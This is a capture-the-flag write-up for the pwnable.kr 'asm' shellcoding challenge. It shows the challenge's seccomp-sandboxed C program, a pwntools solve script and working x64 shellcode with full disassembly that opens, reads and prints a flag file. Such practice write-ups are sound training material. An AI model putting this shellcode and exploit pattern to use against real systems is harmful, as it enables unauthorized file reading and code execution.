#pwnable.kr - ASM


#Callenge
```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <seccomp.h>
#include <sys/prctl.h>
#include <fcntl.h>
#include <unistd.h>

#define LENGTH 128

void sandbox(){
	scmp_filter_ctx ctx = seccomp_init(SCMP_ACT_KILL);
	if (ctx == NULL) {
		printf("seccomp error\n");
		exit(0);
	}

	seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(open), 0);
	seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), 0);
	seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), 0);
	seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit), 0);
	seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit_group), 0);

	if (seccomp_load(ctx) < 0){
		seccomp_release(ctx);
		printf("seccomp error\n");
		exit(0);
	}
	seccomp_release(ctx);
}

char stub[] = "\x48\x31\xc0\x48\x31\xdb\x48\x31\xc9\x48\x31\xd2\x48\x31\xf6\x48\x31\xff\x48\x31\xed\x4d\x31\xc0\x4d\x31\xc9\x4d\x31\xd2\x4d\x31\xdb\x4d\x31\xe4\x4d\x31\xed\x4d\x31\xf6\x4d\x31\xff";
unsigned char filter[256];
int main(int argc, char* argv[]){

	setvbuf(stdout, 0, _IONBF, 0);
	setvbuf(stdin, 0, _IOLBF, 0);

	printf("Welcome to shellcoding practice challenge.\n");
	printf("In this challenge, you can run your x64 shellcode under SECCOMP sandbox.\n");
	printf("Try to make shellcode that spits flag using open()/read()/write() systemcalls only.\n");
	printf("If this does not challenge you. you should play 'asg' challenge :)\n");

	char* sh = (char*)mmap(0x41414000, 0x1000, 7, MAP_ANONYMOUS | MAP_FIXED | MAP_PRIVATE, 0, 0);
	memset(sh, 0x90, 0x1000);
	memcpy(sh, stub, strlen(stub));
	
	int offset = sizeof(stub);
	printf("give me your x64 shellcode: ");
	read(0, sh+offset, 1000);

	alarm(10);
	chroot("/home/asm_pwn");	// you are in chroot jail. so you can't use symlink in /tmp
	sandbox();
	((void (*)(void))sh)();
	return 0;
}

```

###Solution:

```python
from pwn import *


p = connect('0',9026)
p.recvuntil(b"give me your x64 shellcode: ")
shellcode = b"\x48\x31\xC0\x48\xFF\xC0\x48\xFF\xC0\x48\x31\xD2\x48\x31\xF6\x55\x48\x89\xE5\x48\x81\xEC\xFF\x00\x00\x00\x48\xBF\x6F\x30\x6F\x30\x6F\x6E\x67\x00\x57\x48\xBF\x6F\x30\x6F\x30\x6F\x30\x6F\x30\x57\x48\xBF\x30\x30\x30\x30\x30\x30\x30\x30\x57\x48\xBF\x6F\x6F\x6F\x6F\x30\x30\x30\x30\x57\x48\xBF\x6F\x6F\x6F\x6F\x6F\x6F\x6F\x6F\x57\x48\xBF\x6F\x6F\x6F\x6F\x6F\x6F\x6F\x6F\x57\x48\xBF\x30\x30\x30\x30\x30\x6F\x6F\x6F\x57\x48\xBF\x30\x30\x30\x30\x30\x30\x30\x30\x57\x48\xBF\x30\x30\x30\x30\x30\x30\x30\x30\x57\x48\xBF\x6F\x6F\x6F\x6F\x30\x30\x30\x30\x57\x48\xBF\x6F\x6F\x6F\x6F\x6F\x6F\x6F\x6F\x57\x48\xBF\x6F\x6F\x6F\x6F\x6F\x6F\x6F\x6F\x57\x48\xBF\x6F\x6F\x6F\x6F\x6F\x6F\x6F\x6F\x57\x48\xBF\x6F\x6F\x6F\x6F\x6F\x6F\x6F\x6F\x57\x48\xBF\x6F\x6F\x6F\x6F\x6F\x6F\x6F\x6F\x57\x48\xBF\x6F\x6F\x6F\x6F\x6F\x6F\x6F\x6F\x57\x48\xBF\x6F\x6F\x6F\x6F\x6F\x6F\x6F\x6F\x57\x48\xBF\x6F\x6F\x6F\x6F\x6F\x6F\x6F\x6F\x57\x48\xBF\x6F\x6F\x6F\x6F\x6F\x6F\x6F\x6F\x57\x48\xBF\x73\x5F\x76\x65\x72\x79\x5F\x6C\x57\x48\xBF\x65\x5F\x6E\x61\x6D\x65\x5F\x69\x57\x48\xBF\x5F\x74\x68\x65\x5F\x66\x69\x6C\x57\x48\xBF\x6C\x65\x2E\x73\x6F\x72\x72\x79\x57\x48\xBF\x5F\x74\x68\x69\x73\x5F\x66\x69\x57\x48\xBF\x61\x73\x65\x5F\x72\x65\x61\x64\x57\x48\xBF\x66\x69\x6C\x65\x5F\x70\x6C\x65\x57\x48\xBF\x6B\x72\x5F\x66\x6C\x61\x67\x5F\x57\x48\xBF\x70\x77\x6E\x61\x62\x6C\x65\x2E\x57\x48\xBF\x74\x68\x69\x73\x5F\x69\x73\x5F\x57\x48\x89\xE7\x0F\x05\x48\x89\xC7\x48\x31\xC0\x48\xC7\xC2\xFF\x00\x00\x00\x48\x89\xE6\x0F\x05\x48\x89\xC2\x48\x31\xC0\x48\xFF\xC0\x48\x31\xFF\x48\xFF\xC7\x0F\x05\x48\xC7\xC0\x3C\x00\x00\x00\x48\x31\xFF\x0F\x05"



p.sendline(shellcode)
print(p.readline())
p.interactive()

```

###Shellcode:
```asm
0:  48 31 c0                xor    rax,rax
3:  48 ff c0                inc    rax
6:  48 ff c0                inc    rax
9:  48 31 d2                xor    rdx,rdx
c:  48 31 f6                xor    rsi,rsi
f:  55                      push   rbp
10: 48 89 e5                mov    rbp,rsp
13: 48 81 ec ff 00 00 00    sub    rsp,0xff
1a: 48 bf 6f 30 6f 30 6f    movabs rdi,0x676e6f306f306f
21: 6e 67 00
24: 57                      push   rdi
25: 48 bf 6f 30 6f 30 6f    movabs rdi,0x306f306f306f306f
2c: 30 6f 30
2f: 57                      push   rdi
30: 48 bf 30 30 30 30 30    movabs rdi,0x3030303030303030
37: 30 30 30
3a: 57                      push   rdi
3b: 48 bf 6f 6f 6f 6f 30    movabs rdi,0x303030306f6f6f6f
42: 30 30 30
45: 57                      push   rdi
46: 48 bf 6f 6f 6f 6f 6f    movabs rdi,0x6f6f6f6f6f6f6f6f
4d: 6f 6f 6f
50: 57                      push   rdi
51: 48 bf 6f 6f 6f 6f 6f    movabs rdi,0x6f6f6f6f6f6f6f6f
58: 6f 6f 6f
5b: 57                      push   rdi
5c: 48 bf 30 30 30 30 30    movabs rdi,0x6f6f6f3030303030
63: 6f 6f 6f
66: 57                      push   rdi
67: 48 bf 30 30 30 30 30    movabs rdi,0x3030303030303030
6e: 30 30 30
71: 57                      push   rdi
72: 48 bf 30 30 30 30 30    movabs rdi,0x3030303030303030
79: 30 30 30
7c: 57                      push   rdi
7d: 48 bf 6f 6f 6f 6f 30    movabs rdi,0x303030306f6f6f6f
84: 30 30 30
87: 57                      push   rdi
88: 48 bf 6f 6f 6f 6f 6f    movabs rdi,0x6f6f6f6f6f6f6f6f
8f: 6f 6f 6f
92: 57                      push   rdi
93: 48 bf 6f 6f 6f 6f 6f    movabs rdi,0x6f6f6f6f6f6f6f6f
9a: 6f 6f 6f
9d: 57                      push   rdi
9e: 48 bf 6f 6f 6f 6f 6f    movabs rdi,0x6f6f6f6f6f6f6f6f
a5: 6f 6f 6f
a8: 57                      push   rdi
a9: 48 bf 6f 6f 6f 6f 6f    movabs rdi,0x6f6f6f6f6f6f6f6f
b0: 6f 6f 6f
b3: 57                      push   rdi
b4: 48 bf 6f 6f 6f 6f 6f    movabs rdi,0x6f6f6f6f6f6f6f6f
bb: 6f 6f 6f
be: 57                      push   rdi
bf: 48 bf 6f 6f 6f 6f 6f    movabs rdi,0x6f6f6f6f6f6f6f6f
c6: 6f 6f 6f
c9: 57                      push   rdi
ca: 48 bf 6f 6f 6f 6f 6f    movabs rdi,0x6f6f6f6f6f6f6f6f
d1: 6f 6f 6f
d4: 57                      push   rdi
d5: 48 bf 6f 6f 6f 6f 6f    movabs rdi,0x6f6f6f6f6f6f6f6f
dc: 6f 6f 6f
df: 57                      push   rdi
e0: 48 bf 6f 6f 6f 6f 6f    movabs rdi,0x6f6f6f6f6f6f6f6f
e7: 6f 6f 6f
ea: 57                      push   rdi
eb: 48 bf 73 5f 76 65 72    movabs rdi,0x6c5f797265765f73
f2: 79 5f 6c
f5: 57                      push   rdi
f6: 48 bf 65 5f 6e 61 6d    movabs rdi,0x695f656d616e5f65
fd: 65 5f 69
100:    57                      push   rdi
101:    48 bf 5f 74 68 65 5f    movabs rdi,0x6c69665f6568745f
108:    66 69 6c
10b:    57                      push   rdi
10c:    48 bf 6c 65 2e 73 6f    movabs rdi,0x7972726f732e656c
113:    72 72 79
116:    57                      push   rdi
117:    48 bf 5f 74 68 69 73    movabs rdi,0x69665f736968745f
11e:    5f 66 69
121:    57                      push   rdi
122:    48 bf 61 73 65 5f 72    movabs rdi,0x646165725f657361
129:    65 61 64
12c:    57                      push   rdi
12d:    48 bf 66 69 6c 65 5f    movabs rdi,0x656c705f656c6966
134:    70 6c 65
137:    57                      push   rdi
138:    48 bf 6b 72 5f 66 6c    movabs rdi,0x5f67616c665f726b
13f:    61 67 5f
142:    57                      push   rdi
143:    48 bf 70 77 6e 61 62    movabs rdi,0x2e656c62616e7770
14a:    6c 65 2e
14d:    57                      push   rdi
14e:    48 bf 74 68 69 73 5f    movabs rdi,0x5f73695f73696874
155:    69 73 5f
158:    57                      push   rdi
159:    48 89 e7                mov    rdi,rsp
15c:    0f 05                   syscall
15e:    48 89 c7                mov    rdi,rax
161:    48 31 c0                xor    rax,rax
164:    48 c7 c2 ff 00 00 00    mov    rdx,0xff
16b:    48 89 e6                mov    rsi,rsp
16e:    0f 05                   syscall
170:    48 89 c2                mov    rdx,rax
173:    48 31 c0                xor    rax,rax
176:    48 ff c0                inc    rax
179:    48 31 ff                xor    rdi,rdi
17c:    48 ff c7                inc    rdi
17f:    0f 05                   syscall
181:    48 c7 c0 3c 00 00 00    mov    rax,0x3c
188:    48 31 ff                xor    rdi,rdi
18b:    0f 05                   syscall
```